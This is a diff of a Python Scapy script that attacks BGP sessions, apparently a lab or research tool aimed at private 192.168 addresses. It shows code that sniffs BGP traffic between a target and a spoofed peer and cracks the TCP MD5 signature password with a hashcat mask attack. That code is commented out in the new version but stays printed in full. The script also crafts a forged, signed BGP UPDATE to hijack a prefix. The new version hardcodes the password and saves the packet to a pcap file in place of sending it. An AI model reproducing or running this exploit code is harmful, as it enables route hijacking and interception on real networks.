@@ -11,57 +11,61 @@ INTERFACE = "eth0"
 hashcat_mask = "-1 ?u?l -2 ?u?l?d ?1?1?1?1?1?1?1?1 --increment --increment-min 4"
 IP_TARGET = "192.168.12.1"
 IP_TO_SPOOF = "192.168.12.2"
-NETWORK_TO_ADVERTISE = "10.0.0.0/8"
-PATH = [2,3]
-LOCAL_PREF = 87
+NETWORK_TO_ADVERTISE = "192.168.100.0/24"
+NEXT_HOP = "192.168.12.2"
+MULTI_EXIT_DISC = "0"
+ORIGIN = "IGP"
+PATH = [2]
+#LOCAL_PREF = 87
+LOCAL_PREF = 0
 BGP_PORT = 179
 
 #global variables
 SEQUENCE_NUMBER = -1
 ACK_NUMBER = -1
 BGP_password = ""
-
-def break_password(pkt, mask):
-    """Takes a scapy packet and a hashcat mask, runs a hashcat mask attack on the TCP MD5 signature to find the password"""
-    hash_found = False
-    if TCP not in pkt:
-        pkt.show()
-        raise Exception("Cannot find a TCP MD signature in a non TCP packet")
-    else:
-        if "options" in pkt[TCP].fields:
-            for op in pkt[TCP].options:
-                if op[0] == 19:
-                    tcp_hash = op[1]
-                    hash_found = True
-                    break
-        if hash_found == False:
-            pkt.show()
-            raise Exception("TCP packet has no MD signature")
-        else:
-            raw_ip_data = raw(pkt[IP])
-            raw_tcp_data = raw(pkt[TCP])
-            #get the salt from these bytes
-            salt = TCP_MD5_parser.get_md5_salt_from_bytes(raw_ip_data, raw_tcp_data)
-            #call hashcat
-            result = TCP_MD5_parser.launch_hashcat(tcp_hash, salt, mask)
-            if result == "":
-                raise Exception("Could not break password of hash {}".format(tcp_hash))
-            else:
-                password = result.split(":")[2]
-                return password
-
-def filter_bgp_packet_to_break(pkt, ip_target, ip_to_spoof):
-    """Filters for BGP packets which are between the targeted and spoofed AS"""
-    if TCP in pkt:
-        if pkt[TCP].dport == BGP_PORT or pkt[TCP].sport == BGP_PORT:
-            # if it is a BGP packet
-            if pkt[IP].src == ip_target and pkt[IP].dst == ip_to_spoof:
-                #this is a packet coming from the target AS to the BGP port of another AS
-                return True
-            if pkt[IP].dst == ip_target and pkt[IP].src == ip_to_spoof:
-                #this is a packet coming to the target AS on its BGP port
-                return True
-    return False
+#
+# def break_password(pkt, mask):
+#     """Takes a scapy packet and a hashcat mask, runs a hashcat mask attack on the TCP MD5 signature to find the password"""
+#     hash_found = False
+#     if TCP not in pkt:
+#         pkt.show()
+#         raise Exception("Cannot find a TCP MD signature in a non TCP packet")
+#     else:
+#         if "options" in pkt[TCP].fields:
+#             for op in pkt[TCP].options:
+#                 if op[0] == 19:
+#                     tcp_hash = op[1]
+#                     hash_found = True
+#                     break
+#         if hash_found == False:
+#             pkt.show()
+#             raise Exception("TCP packet has no MD signature")
+#         else:
+#             raw_ip_data = raw(pkt[IP])
+#             raw_tcp_data = raw(pkt[TCP])
+#             #get the salt from these bytes
+#             salt = TCP_MD5_parser.get_md5_salt_from_bytes(raw_ip_data, raw_tcp_data)
+#             #call hashcat
+#             result = TCP_MD5_parser.launch_hashcat(tcp_hash, salt, mask)
+#             if result == "":
+#                 raise Exception("Could not break password of hash {}".format(tcp_hash))
+#             else:
+#                 password = result.split(":")[2]
+#                 return password
+#
+# def filter_bgp_packet_to_break(pkt, ip_target, ip_to_spoof):
+#     """Filters for BGP packets which are between the targeted and spoofed AS"""
+#     if TCP in pkt:
+#         if pkt[TCP].dport == BGP_PORT or pkt[TCP].sport == BGP_PORT:
+#             # if it is a BGP packet
+#             if pkt[IP].src == ip_target and pkt[IP].dst == ip_to_spoof:
+#                 #this is a packet coming from the target AS to the BGP port of another AS
+#                 return True
+#             if pkt[IP].dst == ip_target and pkt[IP].src == ip_to_spoof:
+#                 #this is a packet coming to the target AS on its BGP port
+#                 return True
+#     return False
 
 def inject_malicious_packet(seq_num, ack_num, source_port):
     """crafts and sends a BGPUpdate to the targeted AS spoofing the AS we want to spoof"""
@@ -70,16 +74,19 @@ def inject_malicious_packet(seq_num, ack_num, source_port):
     tcp.seq = seq_num
     tcp.ack = ack_num
     hdr = BGPHeader(type=2, marker=0xffffffffffffffffffffffffffffffff)  
-    bgp_packet = craft_BGP_update_packet(NETWORK_TO_ADVERTISE, path=PATH, local_pref=LOCAL_PREF)
+    bgp_packet = craft_BGP_update_packet(NETWORK_TO_ADVERTISE, path=PATH, next_hop=NEXT_HOP, origin=ORIGIN,
+                                         multi_exit_disc=MULTI_EXIT_DISC)
     packet = Ether()/ ip / tcp / hdr / bgp_packet
-    signed_packet = sign_single_packet(packet,BGP_password)
+    signed_packet = sign_single_packet(packet, BGP_password)
     #recompute packet to compute checksums
     signed_packet = signed_packet.__class__(bytes(signed_packet))
-    # signed_packet.show()
+    #signed_packet.show()
+    signed_packet.display()
+    wrpcap('update_example_crafted .pcap', signed_packet)
     print("MALICOUS PACKET CRAFTED")
-    send(signed_packet)
-    signed_packet.show()
-    print("Attack done, exiting")
+    #send(signed_packet)
+    #signed_packet.show()
+    #print("Attack done, exiting")
     exit()
 
 
@@ -115,21 +122,23 @@ def packet_callback(captured_packet):
 
 
 def main(argv):
-    if len(argv) != 2:
-        print(f"Usage: {argv[0]} <interface_name>")
-        print(f"\n\t i.e.: {argv[0]} \"eth0\"")
-        sys.exit(-1)
+    #if len(argv) != 2:
+    #    print(f"Usage: {argv[0]} <interface_name>")
+    #    print(f"\n\t i.e.: {argv[0]} \"eth0\"")
+    #    sys.exit(-1)
 
-    INTERFACE = argv[1]
+    #INTERFACE = argv[1]
 
-    print("[*] Sniffing a packet to break TCP MD5 password")
-    packet_to_break = sniff(lfilter=lambda p: filter_bgp_packet_to_break(p, IP_TARGET, IP_TO_SPOOF), count=1, iface=INTERFACE)[0]
-    print("[*] Packet found !")
-    print("[*] Breaking password")
+    #print("[*] Sniffing a packet to break TCP MD5 password")
+    #packet_to_break = sniff(lfilter=lambda p: filter_bgp_packet_to_break(p, IP_TARGET, IP_TO_SPOOF), count=1, iface=INTERFACE)[0]
+    #print("[*] Packet found !")
+    #print("[*] Breaking password")
     global BGP_password
-    BGP_password = break_password(packet_to_break, hashcat_mask)
-    print("[*] Password broken: " + BGP_password)
-    sniff(prn=lambda p : packet_callback(p), filter="tcp", iface=INTERFACE)
+    BGP_password = 'azerty'
+    inject_malicious_packet(seq_num=1, ack_num=1, source_port=19108)
+    #BGP_password = break_password(packet_to_break, hashcat_mask)
+    #print("[*] Password broken: " + BGP_password)
+    #sniff(prn=lambda p : packet_callback(p), filter="tcp", iface=INTERFACE)
 
 
 
